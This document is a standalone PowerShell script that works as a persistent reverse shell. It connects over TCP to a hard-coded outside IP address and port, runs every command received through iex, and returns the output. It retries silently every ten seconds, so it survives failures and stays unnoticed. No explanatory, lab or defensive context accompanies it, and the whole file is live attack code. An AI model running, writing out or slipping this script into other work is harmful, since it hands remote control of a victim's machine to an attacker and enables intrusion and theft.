while ($true) {
    try {
        $client = New-Object System.Net.Sockets.TCPClient("67.183.186.191",4911)
        $stream = $client.GetStream()
        [byte[]]$bytes = 0..65535 | % {0}

        while ($stream.CanRead) {
            try {
                $i = $stream.Read($bytes, 0, $bytes.Length)
                if ($i -le 0) { break }  # Stream closed

                $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes, 0, $i)
                if ($data -eq "exit") { break }  # Exit command from server

                $sendback = (iex $data 2>&1 | Out-String)
                $sendback2 = $sendback + "PS " + (pwd).Path + "> "
                $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
                $stream.Write($sendbyte, 0, $sendbyte.Length)
                $stream.Flush()
            } catch {
                break  # Any error: break the inner loop and retry
            }
        }

        $stream.Close()
        $client.Close()
    } catch {
        # Connection failed — retry quietly
    }

    Start-Sleep -Seconds 10
}
